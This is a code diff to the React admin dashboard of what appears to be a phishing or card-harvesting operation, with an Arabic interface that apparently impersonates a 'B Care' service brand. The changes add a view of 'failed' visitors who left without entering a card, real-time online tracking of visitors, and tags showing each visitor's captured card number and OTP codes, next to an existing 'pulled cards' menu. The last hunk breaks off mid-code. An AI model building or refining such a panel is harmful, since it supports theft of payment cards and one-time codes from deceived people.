@@ -50,20 +50,50 @@ export const Admin = () => {
   const [mobileDetailsActive, setMobileDetailsActive] = useState(false);
   const [isSoundEnabled, setIsSoundEnabled] = useState(true);
   const [unreadCustomers, setUnreadCustomers] = useState(new Set());
+  const [currentTime, setCurrentTime] = useState(Date.now());
+
+  useEffect(() => {
+    const timer = setInterval(() => setCurrentTime(Date.now()), 15000); // update every 15s for online status
+    return () => clearInterval(timer);
+  }, []);
 
   const notificationSound = useRef(new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3'));
   const lastStateRef = useRef({});
 
-  // Stats Logic
-  const stats = useMemo(() => {
-    const now = new Date().getTime();
-    const total = customers.length;
-    const completed = customers.filter(c => c.status === 'completed').length;
-    const rejected = customers.filter(c => c.status === 'rejected').length;
-    const withCards = customers.filter(c => c.card_number).length;
-    const onlineNow = customers.filter(c => (now - (c.last_heartbeat || c.last_update || 0)) < 15000).length;
-    return { total, completed, rejected, withCards, onlineNow };
-  }, [customers]);
+  // Stats and Filtering Logic
+  const { stats, activeCustomers, failedCustomers } = useMemo(() => {
+    let total = customers.length;
+    let completed = 0;
+    let rejected = 0;
+    let withCards = 0;
+    let onlineNow = 0;
+    
+    const active = [];
+    const failed = [];
+
+    customers.forEach(c => {
+      const isOnline = (currentTime - (c.last_heartbeat || c.last_update || 0)) < 15000;
+      if (c.status === 'completed') completed++;
+      if (c.status === 'rejected') rejected++;
+      if (c.card_number) withCards++;
+      if (isOnline) onlineNow++;
+
+      const isInactive = (currentTime - (c.last_heartbeat || c.last_update || 0)) > 3 * 60 * 1000;
+      
+      // Failed: No card entered AND inactive for more than 3 minutes
+      if (!c.card_number && isInactive) {
+        failed.push(c);
+      } else {
+        active.push(c);
+      }
+    });
+
+    return { 
+      stats: { total, completed, rejected, withCards, onlineNow },
+      activeCustomers: active,
+      failedCustomers: failed
+    };
+  }, [customers, currentTime]);
 
   // Real-time Customers Fetch
   useEffect(() => {
@@ -378,6 +408,26 @@ export const Admin = () => {
     </div>
   );
 
+  // Memoized Sidebar Item to prevent lag during heartbeat updates
+  const CustomerListItem = React.memo(({ c, isSelected, hasNewAction, isOnline, onClick }) => (
+    <div
+      className={`sidebar-item-v2 ${isSelected ? 'active' : ''} ${hasNewAction ? 'has-new-action' : ''}`}
+      onClick={() => onClick(c.id)}
+    >
+      <div className="item-main-info">
+        <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
+        <span className={`online-status-v2 ${isOnline ? 'online' : 'offline'}`}>
+          {isOnline ? 'متصل' : 'غادر'}
+        </span>
+      </div>
+      <div className="item-page-row">{c.page || 'الرئيسية'}</div>
+      <div className="item-indicators">
+        {c.card_number && <span className="indicator-tag">💳 بطاقة</span>}
+        {c.otps && c.otps.length > 0 && <span className="indicator-tag">💬 {c.otps.length} رمز</span>}
+      </div>
+    </div>
+  ));
+
   return (
     <div className="admin-v2-root" dir="rtl">
       <div className="admin-top-banner">حمل تطبيق بي كير الآن واستمتع بخدمات أكثر</div>
@@ -391,6 +441,7 @@ export const Admin = () => {
               <div className="gear-dropdown-v2" onMouseLeave={() => setIsGearOpen(false)}>
                 <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16} /> الإحصائيات</button>
                 <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16} /> البطاقات المسحوبة</button>
+                <button onClick={() => { setCurrentView('failed'); setIsGearOpen(false); }}><AlertCircle size={16} /> العملاء المنسحبين</button>
                 <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16} /> تغيير كلمة المرور</button>
                 <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{ color: 'red' }}><Trash2 size={16} /> حذف كافة البيانات</button>
                 <hr />
@@ -425,28 +476,13 @@ export const Admin = () => {
         {/* Sidebar (Right) */}
         <aside className="admin-sidebar-v2">
           <div className="sidebar-header-v2">
-            <h2>العملاء ({customers.length})</h2>
+            <h2>العملاء النشطين ({activeCustomers.length})</h2>
             <button className="icon-btn" onClick={() => setCurrentView('workspace')}><ArrowRight size={18} /></button>
           </div>
           <div className="sidebar-search-v2">
             <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
           </div>
           <div className="sidebar-list-v2">
-            {customers.filter(c => (c.full_name || c.id_number || 'عميل جديد').includes(searchQuery)).map(c => {
-              const online = isUserOnline(c);
-              return (
-                <div
-                  key={c.id}
-                  className={`sidebar-item-v2 ${selectedCustomerId === c.id ? 'active' : ''} ${unreadCustomers.has(c.id) ? 'has-new-action' : ''}`}
-                  onClick={() => {
-                    setSelectedCustomerId(c.id);
-                    setCurrentView('workspace');
-                    setMobileDetailsActive(true);
-                    // Clear unread status
-                    setUnreadCustomers(prev => {
-                      const next = new Set(prev);
-                      next.delete(c.id);
-                      return next;
                     });
                   }}
                 >
